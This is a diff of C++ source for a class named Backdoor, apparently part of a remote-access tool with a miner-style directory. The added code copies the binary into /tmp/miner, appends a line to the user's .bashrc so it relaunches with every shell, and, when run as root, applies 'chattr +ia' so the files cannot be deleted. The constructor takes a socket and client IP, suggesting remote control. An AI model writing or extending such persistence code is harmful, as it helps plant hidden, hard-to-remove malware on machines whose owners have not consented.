@@ -73,23 +73,30 @@ void Backdoor::menu(){
 
 void Backdoor::persistence(){
     
+    // variables
     const char *  root_path_init_d = "/etc/init.d";
     const char * persistence_directory = "/tmp/miner";
     const char * chattr = "sudo chattr +ia /tmp/miner/";
-
     std::string bash_rc_file = std::string(this->user_home) += std::string(".bashrc");
-    const char *bash_rc = bash_rc_file.c_str();
+    std::string move_to_dir = std::string("cp ") += std::string(this->program_name) += std::string(" ")
+                            += std::string(persistence_directory);
+    const char * copy = move_to_dir.c_str();
     
-    std::cout << "Running persistence" << std::endl;
+    std::string bash_rc_command_execution = std::string("cd /tmp/miner/; ./") += std::string(this->program_name);
+    std::string bash_rc_insertion = std::string("echo \"") += bash_rc_command_execution += std::string("\"") 
+                                    += std::string(" >> ") += bash_rc_file;
+    const char * persistence_on_bash_rc = bash_rc_insertion.c_str();
 
+
+    // create directory to store stuff
     mkdir(persistence_directory, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+    this->execute_command(copy);
+    this->execute_command(persistence_on_bash_rc);
 
     if(geteuid() != 0){
         std::cout << "Not root";
 
     }else{
-        
-
         // only root can delete.
         this->execute_command(chattr);
         std::cout << "root";
@@ -175,6 +182,9 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->c  = c;
     this->is_server = is_server;
     this->client_ip = ip;
+
+    program_name = (char*)malloc(10);
+    strcpy(this->program_name, "backdoor");
 
     if(is_server){
         //menu();
